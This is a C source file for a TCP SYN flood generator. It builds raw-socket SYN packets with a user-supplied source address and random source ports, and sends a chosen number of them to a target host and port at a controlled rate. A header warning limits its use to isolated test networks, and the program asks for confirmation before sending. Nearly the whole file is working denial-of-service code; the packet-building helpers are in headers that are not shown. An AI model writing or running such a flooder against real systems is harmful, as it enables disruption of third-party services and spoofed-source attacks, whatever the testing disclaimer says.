/*
 * TCP SYN Flood Generator
 * 
 * ! Warning !
 *   1. Use for Testing Purposes Only
 *       Abuse is STRICTLY PROHIBITED.
 * 
 *   2. Testing Environment Only
 *       NEVER EXECUTE this program in a 'Production Environment'.
 *       PLEASE EXECUTE it ONLY IN 'Testing Environment' ISOLATED from the INTERNET.
 *       Also, PLEASE USE Testing Equipment for client/server.
 * 
 *   3. Pay Attention to the Number of Packets Sent
 *       As the number of packets increases, the load on client/server/firewall/router increases.
 *       To avoid unexpected system crashes, PLEASE ADJUST the number of packets sent in SMALL INCREMENTS.
 * 
 */


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>

#include "socket.h"
#include "tcp.h"
#include "genrand.h"


int main(int argc, char **argv) {
    /* ip packet */
    struct inet_addr src, dst;
    unsigned short sport, dport;
    char recvdata[1500];
    int num_packets;
    
    /* socket */
    int sockfd;
    struct sockaddr_inet sockdst;
    struct sockinfo socket;

    /* time measurement */
    struct timeval t_start, t_end;
    double elapsed_time;

    /* interval */
    int sleep_time;

    /* parse arguments */
    if (argc != 5) {
        fprintf(stderr, "error: too few arguments to the command.\n");
        fprintf(stderr, "usage: $ sudo %s [src address] [dst address] [dst port] [num of packets]\n", argv[0]);
        exit(1);
    }

    /* Confirmation  */
    char ans;
    printf("[Environment Information]\n");
    printf(" Source Address        : %s\n", argv[1]);
    printf(" Destination Address   : %s\n", argv[2]);
    printf(" Destination Port      : %s\n", argv[3]);
    printf(" Number of Packets(CPS): %s\n", argv[4]);
    printf("\nGenerate packets with this setting. Is it OK? [y/n]: ");
    scanf("%c", &ans);
    printf("\n");
    if (ans != 'y') {
        printf("Exit.\n");
        exit(0);
    }

    /* set parameter */
    src.s_addr  = inet_addr(argv[1]);
    dst.s_addr  = inet_addr(argv[2]);
    dport       = atoi(argv[3]);
    num_packets = atoi(argv[4]);
    sleep_time  = (1000000 / num_packets) - 200;    /* adjust CPS */

    /* create raw socket */
    sockfd = rsockfd(IPP_TCP);
    setsockaddr(&sockdst, dst, dport);

    /* set socket info */
    socket.fd       = sockfd;
    socket.src_addr = &src;
    socket.dst_addr = &dst;
    socket.dst_port = dport;
    socket.sockdst  = sockdst;

    /* start time measurement */
    gettimeofday(&t_start, NULL);

    for (int i = 0; i < num_packets; i++) {
        printf("Sending TCP SYN Packets ... %d/%d\r", i + 1, num_packets);

        /* set random source port 49152 - 65535 */
        sport           = gen_sport();
        socket.src_port = sport;

        /* send TCP SYN */
        tcp_syn(&socket, recvdata);

        usleep(sleep_time);
    }

    /* end time measurement */
    gettimeofday(&t_end, NULL);

    /* results */
    elapsed_time = (t_end.tv_sec - t_start.tv_sec) * 1000.0;
    elapsed_time += (t_end.tv_usec - t_start.tv_usec) / 1000.0;
    printf("\n\nAll Packes have been sent.\n");
    printf("ElapsedTime: %f ms\n", elapsed_time);

    close(sockfd);
}
